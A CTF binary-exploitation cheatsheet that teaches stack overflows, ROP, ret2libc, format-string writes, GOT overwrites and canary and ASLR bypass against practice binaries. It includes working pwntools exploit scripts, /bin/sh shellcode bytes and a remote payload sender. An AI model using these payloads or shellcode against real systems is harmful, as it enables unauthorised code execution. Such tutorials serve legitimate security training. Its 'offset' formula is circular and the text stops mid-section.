# CTF Binary Exploitation - Complete Cheatsheet & Workflow Guide

## Table of Contents
1. [Introduction to Binary Exploitation](#introduction-to-binary-exploitation)
2. [Environment Setup](#environment-setup)
3. [C Programming Fundamentals](#c-programming-fundamentals)
4. [Binary Analysis Tools](#binary-analysis-tools)
5. [Common Vulnerabilities](#common-vulnerabilities)
6. [Buffer Overflow Exploitation](#buffer-overflow-exploitation)
7. [Return-Oriented Programming (ROP)](#return-oriented-programming-rop)
8. [Format String Vulnerabilities](#format-string-vulnerabilities)
9. [Shellcode Development](#shellcode-development)
10. [Automation Scripts](#automation-scripts)
11. [Binary Exploitation Workflow](#binary-exploitation-workflow)
12. [Tools & Resources](#tools--resources)

---

## Introduction to Binary Exploitation

### What is Binary Exploitation?

Binary exploitation (pwn) involves finding and exploiting vulnerabilities in compiled programs to:
- Execute arbitrary code
- Bypass authentication
- Read sensitive data
- Gain shell access
- Escalate privileges

### Common Attack Vectors

1. **Buffer Overflow**: Overwriting memory beyond allocated space
2. **Format String**: Exploiting printf-style functions
3. **Integer Overflow**: Causing arithmetic wraparound
4. **Use-After-Free**: Accessing freed memory
5. **Race Conditions**: Exploiting timing issues

---

## Environment Setup

### Linux Tools Installation

```bash
# Essential tools
sudo apt update
sudo apt install -y gcc gdb python3 python3-pip
sudo apt install -y netcat nmap ltrace strace
sudo apt install -y binutils file checksec

# GDB enhancements
pip3 install pwntools
pip3 install ropper

# Install peda (Python Exploit Development Assistance for GDB)
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit

# Or install pwndbg (recommended)
git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh

# Or install GEF (GDB Enhanced Features)
bash -c "$(curl -fsSL https://gef.blah.cat/sh)"
```

### Disable ASLR (for practice)

```bash
# Temporarily disable ASLR
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

# Re-enable ASLR
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space

# Check current setting
cat /proc/sys/kernel/randomize_va_space
# 0 = disabled
# 1 = conservative randomization
# 2 = full randomization
```

---

## C Programming Fundamentals

### Memory Layout

```
High Address
+------------------+
|  Command Line    |  Arguments and environment
|  & Environment   |
+------------------+
|      Stack       |  Local variables, function calls
|        ↓         |  Grows downward
+------------------+
|                  |
|       ...        |
|                  |
+------------------+
|        ↑         |
|      Heap        |  Dynamic memory (malloc)
|                  |  Grows upward
+------------------+
|      BSS         |  Uninitialized global variables
+------------------+
|      Data        |  Initialized global variables
+------------------+
|      Text        |  Program code (read-only)
+------------------+
Low Address
```

### Stack Frame Structure

```
High Address
+------------------+
|   Arguments      |  Function parameters
+------------------+
|  Return Address  |  Where to return after function
+------------------+  <-- Vulnerable point for buffer overflow
|   Saved EBP      |  Previous frame pointer
+------------------+  <-- EBP/RBP points here
|  Local Variables |  Function local variables
+------------------+
|     Buffer       |  Arrays, strings
+------------------+  <-- ESP/RSP points here (top of stack)
Low Address
```

### Common C Vulnerabilities

#### Unsafe Functions

```c
// DANGEROUS - No bounds checking
gets(buffer);              // Never use!
strcpy(dest, src);         // Can overflow
strcat(dest, src);         // Can overflow
sprintf(buffer, fmt, ...); // Can overflow
scanf("%s", buffer);       // No length limit

// SAFER alternatives
fgets(buffer, size, stdin);        // Bounds checked
strncpy(dest, src, size);          // Limited copy
strncat(dest, src, size);          // Limited concatenate
snprintf(buffer, size, fmt, ...);  // Limited sprintf
scanf("%99s", buffer);             // With width specifier
```

#### Vulnerable Code Example

```c
#include <stdio.h>
#include <string.h>

void win() {
    printf("Flag: CTF{you_got_it}\n");
}

void vulnerable() {
    char buffer[64];
    printf("Enter input: ");
    gets(buffer);  // VULNERABLE!
    printf("You entered: %s\n", buffer);
}

int main() {
    vulnerable();
    return 0;
}
```

### Reading C Source Code for Exploitation

#### Key Things to Look For

1. **Buffer declarations**: Note the size
```c
char buffer[64];      // Only 64 bytes!
char name[32];
int numbers[10];
```

2. **Input functions**: Check for bounds
```c
gets(buffer);         // DANGEROUS
scanf("%s", buffer);  // DANGEROUS
fgets(buffer, 100, stdin);  // Check if 100 > buffer size
```

3. **Hidden functions**: Look for unreachable code
```c
void win() {          // Never called in main()
    system("/bin/sh");
}

void secret_function() {
    print_flag();
}
```

4. **Integer overflows**: Check arithmetic
```c
int size;
scanf("%d", &size);
char *buffer = malloc(size);  // What if size is negative?
```

5. **Format string bugs**: Direct user input to printf
```c
printf(user_input);   // DANGEROUS!
printf("%s", user_input);  // Safe
```

---

## Binary Analysis Tools

### file - Identify Binary Type

```bash
file binary_file

# Output examples:
# ELF 64-bit LSB executable, x86-64
# ELF 32-bit LSB executable, Intel 80386
# ELF 64-bit LSB pie executable (Position Independent)
```

### checksec - Check Security Features

```bash
checksec binary_file

# Or using pwntools
python3 -c "from pwn import *; print(checksec('binary_file'))"
```

**Security Features Explained:**
- **RELRO** (Relocation Read-Only): Protects GOT
  - Partial: GOT is writable after relocation
  - Full: GOT is read-only
- **Stack Canary**: Detection of stack buffer overflows
- **NX** (No-eXecute): Stack is not executable
- **PIE** (Position Independent Executable): ASLR for code
- **RPATH/RUNPATH**: Library search paths

### strings - Extract Readable Text

```bash
strings binary_file
strings binary_file | grep flag
strings binary_file | grep -i password
strings -n 10 binary_file  # Minimum length 10
```

### objdump - Disassemble Binary

```bash
# Disassemble all code
objdump -d binary_file

# Disassemble specific function
objdump -d binary_file | grep '<main>:' -A 20
objdump -d binary_file | grep '<win>:' -A 10

# Show symbols
objdump -t binary_file

# Show section headers
objdump -h binary_file

# Intel syntax (more readable)
objdump -M intel -d binary_file
```

### nm - List Symbols

```bash
nm binary_file
nm -D binary_file  # Dynamic symbols only

# Find specific function
nm binary_file | grep win
nm binary_file | grep main
```

### readelf - Display ELF Information

```bash
readelf -h binary_file    # ELF header
readelf -S binary_file    # Section headers
readelf -s binary_file    # Symbol table
readelf -r binary_file    # Relocations
```

### ltrace - Library Call Tracer

```bash
ltrace ./binary_file
ltrace -i ./binary_file   # Show instruction pointer
ltrace -s 100 ./binary_file  # String length limit
```

### strace - System Call Tracer

```bash
strace ./binary_file
strace -e open,read,write ./binary_file  # Specific calls
```

### GDB - GNU Debugger

#### Basic GDB Commands

```bash
# Start debugging
gdb ./binary_file
gdb -q ./binary_file  # Quiet mode

# Inside GDB
run                    # Run program
run arg1 arg2         # Run with arguments
run < input.txt       # Run with file input

# Breakpoints
break main            # Break at function
break *0x08048abc     # Break at address
info breakpoints      # List breakpoints
delete 1              # Delete breakpoint 1

# Execution control
continue              # Continue execution
next                  # Step over (next line)
step                  # Step into function
finish                # Run until function returns

# Examination
disassemble main      # Disassemble function
x/20x $esp            # Examine 20 words at ESP
x/s 0x08048abc        # Examine string at address
x/10i $eip            # Examine 10 instructions

# Registers (x86)
info registers        # Show all registers
print $eax           # Print EAX value
print $esp           # Print ESP value

# Registers (x64)
print $rax           # Print RAX
print $rsp           # Print RSP
print $rip           # Print RIP

# Stack
backtrace            # Show call stack
frame 0              # Select stack frame

# Pattern generation (with peda/pwndbg)
pattern create 100   # Create pattern
pattern offset 0x41414141  # Find offset
```

#### GDB with Pwndbg/PEDA Commands

```bash
# Enhanced commands (pwndbg/peda)
checksec             # Show security features
vmmap                # Show memory mappings
cyclic 100           # Generate De Bruijn sequence
cyclic -l 0x41414141 # Find offset in pattern
telescope $rsp 20    # Smart stack examination
```

---

## Common Vulnerabilities

### 1. Buffer Overflow

#### Simple Stack Buffer Overflow

**Vulnerable Code:**
```c
void vulnerable() {
    char buffer[64];
    gets(buffer);  // No bounds checking!
}
```

**Exploitation:**
- Input exceeds buffer size
- Overwrites return address on stack
- Redirects execution to arbitrary address

#### Finding the Offset

**Method 1: Manual Calculation**
```bash
# Compile with debug symbols
gcc -g -o vuln vuln.c

# Run in GDB
gdb ./vuln
run
# Cause crash with 'AAAABBBBCCCCDDDD...'

# Find offset
info registers
# Note where EIP/RIP points
```

**Method 2: Pattern Offset**
```bash
# In GDB with peda/pwndbg
pattern create 100
run
# Enter the pattern
pattern offset $eip  # or $rip for 64-bit
```

**Method 3: Python Script**
```python
from pwn import *

# Generate pattern
pattern = cyclic(100)
print(pattern)

# After crash, find offset
offset = cyclic_find(0x61616161)  # Use crashed EIP value
print(f"Offset: {offset}")
```

### 2. Format String Vulnerability

**Vulnerable Code:**
```c
char buffer[100];
fgets(buffer, sizeof(buffer), stdin);
printf(buffer);  // DANGEROUS! Should be printf("%s", buffer);
```

**Exploitation:**
- Read arbitrary memory: `%x %x %x %s`
- Write arbitrary memory: `%n`
- Leak stack values: `%p`

**Basic Format String Payloads:**
```bash
# Leak stack
%p %p %p %p %p

# Read specific position
%7$p  # 7th argument

# Read string
%s

# Write to address (using %n)
# %n writes number of bytes written so far
```

### 3. Integer Overflow

**Vulnerable Code:**
```c
int size;
scanf("%d", &size);
if (size > 0) {
    char *buffer = malloc(size);
    read(0, buffer, size);  // What if size wraps around?
}
```

**Exploitation:**
- Input causes integer wraparound
- Allocated size != read size
- Results in buffer overflow

---

## Buffer Overflow Exploitation

### Basic Exploitation Workflow

Based on your notes, here's the standard approach:

#### Step 1: Download and Analyze

```bash
# Download files
wget http://challenge.com/binary
wget http://challenge.com/source.c

# Make executable
chmod +x binary

# Check security features
checksec binary

# Read source code
cat source.c
```

#### Step 2: Find Functions

**Using objdump:**
```bash
# Find main function
objdump -d binary | grep '<main>:'

# Find win/flag function
objdump -d binary | grep '<win>:'
objdump -d binary | grep '<get_flag>:'

# Output example:
# 08048486 <main>:
# 0804846b <win>:
```

**Using nm:**
```bash
nm binary | grep -E 'main|win|flag'
```

#### Step 3: Calculate Offset

**Your Method (from notes):**
```
offset = address_of_main - (offset_of_main - offset_of_win)

Example:
main at: 0x08048486
win at:  0x0804846b
offset = 0x08048486 - (0x08048486 - 0x0804846b)
offset = 0x0804846b
```

**Alternative: Using GDB**
```bash
gdb ./binary
disassemble main
disassemble win
# Note the addresses
```

#### Step 4: Find Buffer Offset

```bash
# Using pattern
gdb ./binary
pattern create 100
run
# Enter pattern
pattern offset $eip
```

#### Step 5: Craft Exploit

**Manual with Python:**
```python
from pwn import *

# Connection
conn = remote('challenge.com', 1234)
# Or local: p = process('./binary')

# Calculate padding
offset_to_eip = 64  # From pattern offset
win_addr = 0x0804846b  # From objdump

# Create payload
payload = b'A' * offset_to_eip
payload += p32(win_addr)  # p64() for 64-bit

# Send exploit
conn.sendline(payload)

# Get flag
print(conn.recvall().decode())
```

### Complete Example Walkthrough

**Given Source Code:**
```c
#include <stdio.h>
#include <stdlib.h>

void win() {
    system("/bin/cat flag.txt");
}

void vulnerable() {
    char buffer[64];
    printf("Enter your name: ");
    gets(buffer);
    printf("Hello, %s!\n", buffer);
}

int main() {
    vulnerable();
    return 0;
}
```

**Exploitation Steps:**

1. **Compile (for testing):**
```bash
gcc -m32 -fno-stack-protector -no-pie -o vuln vuln.c
```

2. **Find addresses:**
```bash
objdump -d vuln | grep '<win>:'
# 0804846b <win>:

objdump -d vuln | grep '<main>:'
# 08048486 <main>:
```

3. **Find offset:**
```bash
gdb ./vuln
pattern create 100
run
# Enter pattern when prompted
pattern offset $eip
# Offset: 72
```

4. **Create exploit:**
```python
from pwn import *

# Local or remote
p = remote('challenge.com', 1234)
# p = process('./vuln')

offset = 72
win_addr = 0x0804846b

payload = b'A' * offset
payload += p32(win_addr)

p.sendline(payload)
p.interactive()
```

---

## Return-Oriented Programming (ROP)

### What is ROP?

When the stack is non-executable (NX enabled), we can't execute shellcode on the stack. Instead, we chain together existing code snippets ("gadgets") that end in `ret` to perform our desired operations.

### Finding Gadgets

**Using ROPgadget:**
```bash
# Install
pip3 install ROPgadget

# Find all gadgets
ROPgadget --binary binary_file

# Find specific gadget
ROPgadget --binary binary_file | grep 'pop rdi'
ROPgadget --binary binary_file | grep 'pop rsi'
ROPgadget --binary binary_file | grep 'pop rdx'

# Find gadgets in libc
ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep 'pop rdi'
```

**Using ropper:**
```bash
# Install
pip3 install ropper

# Interactive mode
ropper --file binary_file

# Find specific gadget
ropper --file binary_file --search "pop rdi"
```

### Common Gadgets

```assembly
; x64 calling convention
pop rdi; ret     ; 1st argument
pop rsi; ret     ; 2nd argument
pop rdx; ret     ; 3rd argument
pop rcx; ret     ; 4th argument

; x86 calling convention (arguments on stack)
pop eax; ret
pop ebx; ret
pop ecx; ret

; Useful gadgets
xor eax, eax; ret    ; Zero out eax
add rsp, 0x10; ret   ; Stack alignment
mov [rdi], rsi; ret  ; Write to memory
```

### Basic ROP Chain Example

**Scenario**: Call `system("/bin/sh")`

```python
from pwn import *

elf = ELF('./binary')
rop = ROP(elf)

# Find gadgets
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]

# Find system and "/bin/sh"
system_addr = elf.plt['system']  # or use libc
binsh_addr = next(elf.search(b'/bin/sh'))

# Build ROP chain
payload = b'A' * offset
payload += p64(pop_rdi)
payload += p64(binsh_addr)
payload += p64(system_addr)

# Send exploit
p.sendline(payload)
p.interactive()
```

### ret2libc Attack

**Purpose**: Execute libc functions when ASLR is disabled or when we can leak addresses.

```python
from pwn import *

# Addresses (from debugging or leaking)
system_addr = 0x7ffff7a52390
binsh_addr = 0x7ffff7b99d88
exit_addr = 0x7ffff7a45120

pop_rdi = 0x400743

# Build chain
payload = b'A' * offset
payload += p64(pop_rdi)
payload += p64(binsh_addr)
payload += p64(system_addr)
payload += p64(exit_addr)  # Clean exit
```

---

## Format String Vulnerabilities

### Basic Exploitation

**Leak Stack Values:**
```bash
# Try different positions
%p %p %p %p
%1$p %2$p %3$p %4$p

# Direct access
%7$p    # 7th stack value
%10$s   # String at 10th position
```

**Leak Specific Address:**
```python
# If we control the buffer location
payload = p32(target_addr)
payload += b'%7$s'  # Assuming buffer is at position 7
```

**Write to Address:**
```python
# Write value using %n
# %n writes number of characters printed so far

target_addr = 0x0804a020
value = 0x08048430

# Calculate padding needed
padding = value - 8  # 8 bytes for addresses

payload = p32(target_addr)
payload += b'%' + str(padding).encode() + b'c'
payload += b'%7$n'  # Write at position 7
```

### Format String Tools

**Using pwntools:**
```python
from pwn import *

def leak_address(offset):
    payload = f'%{offset}$p'.encode()
    p.sendline(payload)
    leak = p.recvline()
    return int(leak.strip(), 16)

# Automated format string exploit
fmtstr = FmtStr(execute_fmt)
fmtstr.write(target_addr, value)
```

---

## Shellcode Development

### What is Shellcode?

Machine code instructions that spawn a shell or perform other actions. Injected into a vulnerable program.

### Basic x86 Shellcode (32-bit)

**Spawn /bin/sh:**
```python
# Shellcode bytes
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

# In assembly:
"""
xor eax, eax
push eax
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
push eax
push ebx
mov ecx, esp
mov al, 0x0b
int 0x80
"""
```

### Basic x64 Shellcode (64-bit)

**Spawn /bin/sh:**
```python
shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

# In assembly:
"""
xor rsi, rsi
push rsi
movabs rdi, 0x68732f2f6e69622f
push rdi
push rsp
pop rdi
push 0x3b
pop rax
cdq
syscall
"""
```

### Shellcode Constraints

**Common Issues:**
1. **Null bytes**: Terminates strings
   - Solution: Use XOR, alternative instructions
2. **Alphanumeric only**: Some inputs filter characters
   - Solution: Alphanumeric shellcode encoders
3. **Length restrictions**: Limited space
   - Solution: Staged shellcode, egg hunters

### Testing Shellcode

```python
from pwn import *

# Test shellcode locally
context.arch = 'i386'  # or 'amd64'
shellcode = asm(shellcraft.sh())

# Run in a test program
p = process(['./test_shellcode'])
p.sendline(shellcode)
p.interactive()
```

### Shellcode Resources

- **Shell-Storm**: http://shell-storm.org/shellcode/
- **Exploit-DB Shellcodes**: https://www.exploit-db.com/shellcodes
- **Pwntools shellcraft**: Generate shellcode automatically

```python
from pwn import *
context.arch = 'amd64'

# Auto-generate shellcode
sc = shellcraft.sh()
print(asm(sc))
```

---

## Automation Scripts

### 1. Binary Analysis Automation

```python
#!/usr/bin/env python3
from pwn import *
import subprocess

def analyze_binary(filename):
    """Comprehensive binary analysis"""
    print("="*60)
    print(f"Analyzing: {filename}")
    print("="*60)
    
    # File type
    print("\n[*] File Information:")
    subprocess.run(['file', filename])
    
    # Security features
    print("\n[*] Security Features:")
    elf = ELF(filename)
    print(f"    RELRO: {elf.relro}")
    print(f"    Stack Canary: {elf.canary}")
    print(f"    NX: {elf.nx}")
    print(f"    PIE: {elf.pie}")
    
    # Architecture
    print(f"\n[*] Architecture: {elf.arch}")
    print(f"[*] Bits: {elf.bits}")
    
    # Functions
    print("\n[*] Interesting Functions:")
    for func in ['main', 'win', 'flag', 'secret', 'admin', 'shell']:
        if func in elf.symbols:
            addr = elf.symbols[func]
            print(f"    {func}: {hex(addr)}")
    
    # Strings
    print("\n[*] Interesting Strings:")
    result = subprocess.run(['strings', filename], 
                          capture_output=True, text=True)
    for line in result.stdout.split('\n'):
        if any(kw in line.lower() for kw in ['flag', 'password', 'secret']):
            print(f"    {line}")
    
    # PLT entries
    print("\n[*] PLT Functions:")
    for func in ['system', 'execve', 'gets', 'printf', 'scanf']:
        if func in elf.plt:
            print(f"    {func}: {hex(elf.plt[func])}")

if __name__ == '__main__':
    import sys
    if len(sys.argv) < 2:
        print("Usage: python analyze.py <binary>")
        sys.exit(1)
    
    analyze_binary(sys.argv[1])
```

### 2. Function Address Finder

```python
#!/usr/bin/env python3
import subprocess
import re
import sys

def find_function_address(binary, function_name):
    """Find address of a function using objdump"""
    try:
        result = subprocess.run(
            ['objdump', '-d', binary],
            capture_output=True,
            text=True,
            check=True
        )
        
        # Search for function
        pattern = rf'([0-9a-f]+) <{function_name}>:'
        match = re.search(pattern, result.stdout)
        
        if match:
            addr = int(match.group(1), 16)
            return addr
        else:
            print(f"Function '{function_name}' not found")
            return None
            
    except subprocess.CalledProcessError:
        print(f"Error running objdump on {binary}")
        return None

def calculate_exploit_address(binary, target_function='win'):
    """Calculate address for exploitation"""
    main_addr = find_function_address(binary, 'main')
    target_addr = find_function_address(binary, target_function)
    
    if main_addr and target_addr:
        print(f"[*] main: {hex(main_addr)}")
        print(f"[*] {target_function}: {hex(target_addr)}")
        
        # Your method from notes
        offset = main_addr - (main_addr - target_addr)
        print(f"[*] Calculated offset: {hex(offset)}")
        
        return target_addr
    
    return None

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usage: python find_addr.py <binary> [function]")
        sys.exit(1)
    
    binary = sys.argv[1]
    function = sys.argv[2] if len(sys.argv) > 2 else 'win'
    
    calculate_exploit_address(binary, function)
```

### 3. Buffer Overflow Offset Finder

```python
#!/usr/bin/env python3
from pwn import *

def find_offset_auto(binary, input_method='stdin'):
    """Automatically find buffer overflow offset"""
    
    # Generate pattern
    pattern = cyclic(200, n=4)
    
    try:
        # Run program with pattern
        p = process(binary)
        p.sendline(pattern)
        p.wait()
        
        # Get core dump
        core = p.corefile
        
        # Find crashed value
        if context.arch == 'i386':
            crash_value = core.eip
        else:  # x86-64
            crash_value = core.rip
        
        # Find offset
        offset = cyclic_find(crash_value, n=4)
        
        print(f"[+] Crash at: {hex(crash_value)}")
        print(f"[+] Offset found: {offset}")
        
        return offset
        
    except Exception as e:
        print(f"[-] Error: {e}")
        print("[*] Trying manual pattern method...")
        
        # Manual testing
        print("[*] Send this pattern to the program:")
        print(pattern.decode())
        print("\n[*] Then use cyclic_find() with the crashed EIP/RIP value")
        
        return None

if __name__ == '__main__':
    import sys
    if len(sys.argv) < 2:
        print("Usage: python find_offset.py <binary>")
        sys.exit(1)
    
    binary = sys.argv[1]
    context.binary = binary
    
    # Enable core dumps
    import os
    os.system('ulimit -c unlimited')
    
    find_offset_auto(binary)
```

### 4. Automated Exploit Generator

```python
#!/usr/bin/env python3
from pwn import *

def generate_exploit(binary, target_function, offset, 
                    remote_host=None, remote_port=None):
    """Generate exploit script"""
    
    elf = ELF(binary)
    
    # Find target address
    if target_function in elf.symbols:
        target_addr = elf.symbols[target_function]
    else:
        print(f"[-] Function '{target_function}' not found")
        return None
    
    print(f"[+] Target: {target_function} at {hex(target_addr)}")
    print(f"[+] Offset: {offset}")
    
    # Generate exploit script
    exploit_code = f'''#!/usr/bin/env python3
from pwn import *

# Configuration
binary = '{binary}'
offset = {offset}
target_addr = {hex(target_addr)}

# Choose target
if args.REMOTE:
    p = remote('{remote_host or "challenge.com"}', {remote_port or 1234})
else:
    p = process(binary)

# Build payload
payload = b'A' * offset
payload += {"p32(target_addr)" if elf.bits == 32 else "p64(target_addr)"}

# Send exploit
p.sendline(payload)

# Interactive shell or receive flag
p.interactive()
'''
    
    # Save to file
    with open('exploit.py', 'w') as f:
        f.write(exploit_code)
    
    print("\n[+] Exploit saved to exploit.py")
    print("[*] Run with: python exploit.py")
    print("[*] Remote: python exploit.py REMOTE")
    
    return exploit_code

if __name__ == '__main__':
    import sys
    if len(sys.argv) < 4:
        print("Usage: python gen_exploit.py <binary> <function> <offset> [host] [port]")
        sys.exit(1)
    
    binary = sys.argv[1]
    function = sys.argv[2]
    offset = int(sys.argv[3])
    host = sys.argv[4] if len(sys.argv) > 4 else None
    port = int(sys.argv[5]) if len(sys.argv) > 5 else None
    
    generate_exploit(binary, function, offset, host, port)
```

### 5. Netcat Exploit Sender

```python
#!/usr/bin/env python3
from pwn import *

def exploit_netcat(host, port, payload):
    """Send exploit to netcat service"""
    print(f"[*] Connecting to {host}:{port}")
    
    conn = remote(host, port)
    
    # Receive initial prompt
    initial = conn.recv(timeout=2)
    print(f"[*] Received: {initial.decode()}")
    
    # Send payload
    print(f"[*] Sending payload ({len(payload)} bytes)")
    conn.sendline(payload)
    
    # Receive response
    try:
        response = conn.recvall(timeout=5)
        print(f"[+] Response:\n{response.decode()}")
        return response
    except:
        print("[-] No response or connection closed")
        return None
    finally:
        conn.close()

def build_payload(offset, target_addr, bits=32):
    """Build buffer overflow payload"""
    payload = b'A' * offset
    
    if bits == 32:
        payload += p32(target_addr)
    else:
        payload += p64(target_addr)
    
    return payload

if __name__ == '__main__':
    import sys
    
    if len(sys.argv) < 5:
        print("Usage: python nc_exploit.py <host> <port> <offset> <address> [bits]")
        print("Example: python nc_exploit.py example.com 1234 72 0x0804846b 32")
        sys.exit(1)
    
    host = sys.argv[1]
    port = int(sys.argv[2])
    offset = int(sys.argv[3])
    address = int(sys.argv[4], 16)
    bits = int(sys.argv[5]) if len(sys.argv) > 5 else 32
    
    payload = build_payload(offset, address, bits)
    exploit_netcat(host, port, payload)
```

### 6. ROP Chain Builder

```python
#!/usr/bin/env python3
from pwn import *

def build_rop_chain(binary, method='system'):
    """Build ROP chain for common exploits"""
    
    elf = ELF(binary)
    rop = ROP(elf)
    
    print(f"[*] Building ROP chain using method: {method}")
    print(f"[*] Architecture: {elf.arch}-{elf.bits}")
    
    if method == 'system':
        # Find gadgets and addresses
        try:
            pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
            print(f"[+] pop rdi; ret: {hex(pop_rdi)}")
        except:
            print("[-] Could not find pop rdi gadget")
            return None
        
        # Find /bin/sh string
        try:
            binsh = next(elf.search(b'/bin/sh\x00'))
            print(f"[+] /bin/sh: {hex(binsh)}")
        except:
            print("[-] /bin/sh not found in binary")
            return None
        
        # Find system
        if 'system' in elf.plt:
            system = elf.plt['system']
            print(f"[+] system: {hex(system)}")
        else:
            print("[-] system not found in PLT")
            return None
        
        # Build chain
        chain = b''
        chain += p64(pop_rdi)
        chain += p64(binsh)
        chain += p64(system)
        
        print(f"[+] ROP chain built ({len(chain)} bytes)")
        return chain
    
    return None

def find_gadgets(binary, gadget_str):
    """Find specific gadget in binary"""
    print(f"[*] Searching for: {gadget_str}")
    
    try:
        result = subprocess.run(
            ['ROPgadget', '--binary', binary, '--string', gadget_str],
            capture_output=True,
            text=True,
            timeout=10
        )
        
        print(result.stdout)
        return result.stdout
        
    except FileNotFoundError:
        print("[-] ROPgadget not installed. Install with: pip3 install ROPgadget")
        return None
    except subprocess.TimeoutExpired:
        print("[-] Gadget search timed out")
        return None

if __name__ == '__main__':
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: python rop_builder.py <binary> [method]")
        print("Methods: system (default)")
        sys.exit(1)
    
    binary = sys.argv[1]
    method = sys.argv[2] if len(sys.argv) > 2 else 'system'
    
    context.binary = binary
    build_rop_chain(binary, method)
```

---

## Binary Exploitation Workflow

### Complete Exploitation Process

#### Phase 1: Reconnaissance

```bash
# 1. Download files
wget http://challenge.com/binary
wget http://challenge.com/source.c
chmod +x binary

# 2. Basic analysis
file binary
checksec binary
strings binary | grep -E 'flag|password|win'

# 3. Read source code (if available)
cat source.c
# Look for:
# - Buffer sizes
# - Unsafe functions (gets, strcpy, scanf)
# - Hidden/unreachable functions
# - Input validation
```

#### Phase 2: Dynamic Analysis

```bash
# 1. Test normal behavior
./binary
nc challenge.com 1234

# 2. Test with increasing input
python3 -c "print('A'*50)" | ./binary
python3 -c "print('A'*100)" | ./binary
python3 -c "print('A'*200)" | ./binary

# 3. Check for crashes
dmesg | tail  # Look for segfaults
```

#### Phase 3: Finding Vulnerabilities

```bash
# 1. Run with debugger
gdb ./binary
run
# Try to crash it

# 2. Find function addresses
objdump -d binary | grep '<main>:'
objdump -d binary | grep '<win>:'
nm binary | grep -E 'main|win|flag'

# 3. Find offset
gdb ./binary
pattern create 200
run
# Enter pattern
pattern offset $eip  # or $rip
```

#### Phase 4: Exploitation

```python
#!/usr/bin/env python3
from pwn import *

# Configuration
binary = './binary'
host = 'challenge.com'
port = 1234

# Addresses (from analysis)
offset = 72
win_addr = 0x0804846b

# Connect
if args.REMOTE:
    p = remote(host, port)
else:
    p = process(binary)

# Build payload
payload = b'A' * offset
payload += p32(win_addr)  # or p64() for 64-bit

# Send exploit
p.sendline(payload)

# Get flag
p.interactive()
```

### Decision Tree for Exploitation

```
Start
  |
  ├─ Source code available?
  |    ├─ Yes: Read code, find vulnerabilities
  |    └─ No: Reverse engineer with objdump/ghidra
  |
  ├─ What security features enabled?
  |    ├─ No Canary → Stack overflow possible
  |    ├─ No NX → Shellcode possible
  |    ├─ No PIE → Addresses predictable
  |    └─ All enabled → Need info leak + ROP
  |
  ├─ What vulnerability type?
  |    ├─ Buffer overflow → Overwrite return address
  |    ├─ Format string → Leak/write memory
  |    ├─ Use-after-free → Heap exploitation
  |    └─ Integer overflow → Bypass checks
  |
  └─ Craft exploit
       ├─ Find offset
       ├─ Find target address
       ├─ Build payload
       └─ Test and adjust
```

### Common Exploitation Patterns

#### Pattern 1: Simple Buffer Overflow to Win Function
```python
# Your notes scenario
payload = b'A' * offset + p32(win_addr)
```

#### Pattern 2: ret2libc
```python
payload = b'A' * offset
payload += p64(pop_rdi_gadget)
payload += p64(binsh_addr)
payload += p64(system_addr)
```

#### Pattern 3: Shellcode Injection
```python
nop_sled = b'\x90' * 100
shellcode = b"\x31\xc0\x50..."  # execve /bin/sh
payload = nop_sled + shellcode
payload += b'A' * (offset - len(payload))
payload += p32(buffer_addr)  # Jump to NOP sled
```

#### Pattern 4: Format String Leak + Exploit
```python
# Step 1: Leak addresses
payload1 = b'%p ' * 20
p.sendline(payload1)
leak = p.recvline()
# Parse addresses

# Step 2: Exploit with leaked info
payload2 = build_exploit(leaked_addresses)
p.sendline(payload2)
```

---

## Advanced Techniques

### Heap Exploitation

#### Common Heap Vulnerabilities

1. **Use-After-Free**: Accessing freed memory
2. **Double Free**: Freeing same chunk twice
3. **Heap Overflow**: Overwriting adjacent chunks
4. **Off-by-One**: Single byte overflow

#### Basic Heap Exploitation Example

```c
// Vulnerable code
char *ptr1 = malloc(100);
char *ptr2 = malloc(100);

free(ptr1);
// Use-after-free
strcpy(ptr1, user_input);  // ptr1 was freed!

// Double free
free(ptr1);
free(ptr1);  // Double free!
```

### ASLR Bypass Techniques

#### 1. Information Leak
```python
# Leak libc address using format string
payload = b'%p ' * 10
p.sendline(payload)
leak = p.recvline()

# Parse and calculate base
libc_leak = int(leak.split()[3], 16)
libc_base = libc_leak - offset_to_base
```

#### 2. Partial Overwrite
```python
# Overwrite only last bytes (ASLR doesn't randomize these)
# Works when PIE is disabled
payload = b'A' * offset
payload += b'\x34\x12'  # Partial address
```

#### 3. Brute Force (32-bit only)
```python
# ASLR on 32-bit has limited entropy
# Try multiple times
for attempt in range(1000):
    try:
        p = remote(host, port)
        p.sendline(exploit)
        flag = p.recv(timeout=1)
        if b'flag' in flag:
            print(flag)
            break
    except:
        pass
```

### Stack Canary Bypass

#### 1. Leak Canary Value
```python
# Use format string to leak canary
payload = b'%p ' * 20
# Find canary in output (usually has 0x00 at end)
```

#### 2. Brute Force Canary (fork servers)
```python
# Try one byte at a time
for byte in range(256):
    payload = b'A' * offset
    payload += bytes([byte])
    p.sendline(payload)
    # If no crash, correct byte found
```

### GOT Overwrite

```python
# Overwrite GOT entry to redirect function calls
from pwn import *

elf = ELF('./binary')

# Find GOT entry
printf_got = elf.got['printf']

# Overwrite to system
# Using format string
payload = p32(printf_got)
payload += b'%' + str(system_addr - 4).encode() + b'c'
payload += b'%7$n'
```

---

## Debugging Tips

### GDB Workflow

```bash
# 1. Start GDB
gdb ./binary

# 2. Set breakpoints
break main
break *0x08048abc

# 3. Run and examine
run AAAA
x/20x $esp
x/20i $eip

# 4. Step through
ni  # Next instruction
si  # Step into

# 5. Check registers
info registers
p $eax

# 6. Examine memory
x/s $esp  # String
x/20x $esp  # 20 words in hex
x/10i $eip  # 10 instructions
```

### Common GDB Commands for PWN

```bash
